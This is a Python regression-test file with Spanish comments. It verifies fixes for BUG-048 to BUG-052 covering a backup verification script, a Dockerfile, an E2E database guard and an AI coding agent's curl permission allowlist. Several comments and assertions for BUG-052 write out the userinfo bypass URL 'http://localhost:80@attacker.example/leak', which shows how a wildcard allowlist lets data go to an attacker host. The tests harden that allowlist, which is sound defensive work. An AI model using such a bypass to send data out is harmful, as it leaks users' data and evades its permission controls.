"""Fix-group 06: BUG-048..BUG-052.

- BUG-048: NOT-APPLICABLE. El verify script conecta al EPHEMERAL container
  que arranca este mismo script con `POSTGRES_PASSWORD` (default user
  `postgres`). El comentario Codex era sobre un path viejo que conectaba
  al PROD postgres.
- BUG-049: NOT-APPLICABLE. `BACKUP_VERIFY_PG_IMAGE` ya default a
  `pgvector/pgvector:pg16` (línea 125 de verify-backup.sh).
- BUG-050: VIGENTE. Dockerfile no copiaba `docs/runbooks/`, así que
  `list_runbooks()` y los detail endpoints respondían 404 en producción.
- BUG-051: NOT-APPLICABLE. `tests/conftest_e2e.py` ya tiene
  `_EPHEMERAL_DB_MARKERS` + `_is_ephemeral_e2e_url` que valida el marker.
- BUG-052: VIGENTE. `Bash(curl -s http://localhost:*)` permitía
  `http://localhost:80@attacker.example/leak` (userinfo bypass).
  Apretamos a endpoints específicos usados por los runbooks.
"""
from __future__ import annotations

import json
from pathlib import Path


DOCKERFILE = Path('Dockerfile')
VERIFY_SCRIPT = Path('scripts/verify-backup.sh')
CONFTEST_E2E = Path('tests/conftest_e2e.py')
SETTINGS = Path('.claude/settings.json')


# ───── BUG-048 — NOT-APPLICABLE (ephemeral postgres user) ────────────────


def test_bug_048_verify_script_targets_ephemeral_postgres():
    """El verify script conecta al postgres EFÍMERO que arranca este mismo
    script con `POSTGRES_PASSWORD=...`; el usuario default es `postgres`.
    Por eso `postgres://postgres@...` es correcto — no es el postgres prod.
    """
    src = VERIFY_SCRIPT.read_text()
    # El docker run no setea POSTGRES_USER, así que el default es postgres.
    assert 'POSTGRES_PASSWORD="$BACKUP_VERIFY_SUPERUSER_PASSWORD"' in src, (
        'BUG-048: el verify script debe seguir arrancando el ephemeral con '
        'su propio superuser password — el connect string a `postgres@` solo '
        'es válido si el container se creó con `postgres` user (default).'
    )
    # Si alguien introduce POSTGRES_USER personalizado, el connect string
    # actual quedaría inconsistente — defensa anti-regresión.
    assert '-e POSTGRES_USER=' not in src, (
        'BUG-048: el script NO debe override `POSTGRES_USER` en el docker '
        'run; sino los `postgres://postgres@...` connect strings rompen.'
    )


# ───── BUG-049 — NOT-APPLICABLE (default image pgvector) ─────────────────


def test_bug_049_verifier_uses_pgvector_image_by_default():
    src = VERIFY_SCRIPT.read_text()
    assert 'BACKUP_VERIFY_PG_IMAGE="${BACKUP_VERIFY_PG_IMAGE:-pgvector/pgvector:pg16}"' in src, (
        'BUG-049: regresión — la imagen default volvió a `postgres:16-alpine` '
        'que no tiene pgvector. Los backups del schema productivo (con la '
        'extensión vector) fallan al pg_restore.'
    )


# ───── BUG-050 — Dockerfile copia runbooks ───────────────────────────────


def test_bug_050_dockerfile_copies_runbooks():
    src = DOCKERFILE.read_text()
    assert 'COPY docs/runbooks ./docs/runbooks' in src, (
        'BUG-050: Dockerfile debe copiar `docs/runbooks/` al image. Sin '
        'esto, `list_runbooks()` y endpoints de detail responden 404 en '
        'producción aunque las rutas estén registradas (los MD viven en '
        'el repo, no en el image).'
    )


# ───── BUG-051 — NOT-APPLICABLE (E2E guard validates marker) ────────────


def test_bug_051_e2e_guard_checks_ephemeral_marker():
    src = CONFTEST_E2E.read_text()
    assert '_EPHEMERAL_DB_MARKERS' in src, (
        'BUG-051: regresión — `_EPHEMERAL_DB_MARKERS` desapareció. Sin esta '
        'guarda, el suite E2E permite ejecutarse contra cualquier `localhost` '
        'incluido un tunnel a prod, y `_apply_schema` hace `drop schema cascade`.'
    )
    assert "'_e2e'" in src and "'_test'" in src and "'_ci'" in src, (
        'BUG-051: el set de markers debe seguir incluyendo `_e2e`, `_test`, `_ci`.'
    )
    assert '_is_ephemeral_e2e_url' in src, (
        'BUG-051: el helper de validación de URL ephemeral debe existir.'
    )


# ───── BUG-052 — Curl allowlist tightened ────────────────────────────────


def test_bug_052_curl_allowlist_does_not_use_open_wildcard():
    """`Bash(curl -s http://localhost:*)` permite cualquier path/query,
    incluyendo `http://localhost:80@attacker.example/leak` (userinfo).
    Apretamos a endpoints específicos que aparecen en los runbooks.
    """
    raw = json.loads(SETTINGS.read_text())
    allow = raw.get('permissions', {}).get('allow', [])
    open_wildcards = [
        entry for entry in allow
        if entry.startswith('Bash(curl ') and entry.rstrip(')').endswith(':*')
    ]
    assert not open_wildcards, (
        f'BUG-052: regresión — entradas curl con wildcard `:*` permiten '
        f'userinfo bypass (`http://localhost:80@attacker.example/leak`). '
        f'Entradas problemáticas: {open_wildcards}. '
        'Apretar a paths específicos (ej. `http://localhost:8000/metrics`).'
    )


def test_bug_052_curl_allowlist_has_specific_metrics_endpoint():
    """Los runbooks polean `http://localhost:8000/metrics`. La allowlist
    debe incluir ese endpoint específico para no obligar a confirmar cada
    poll legítimo.
    """
    raw = json.loads(SETTINGS.read_text())
    allow = raw.get('permissions', {}).get('allow', [])
    has_metrics_localhost = any(
        'http://localhost:8000/metrics' in entry for entry in allow
    )
    assert has_metrics_localhost, (
        'BUG-052: la allowlist tightened debe seguir permitiendo el poll '
        'legítimo a `http://localhost:8000/metrics` (usado por los runbooks).'
    )
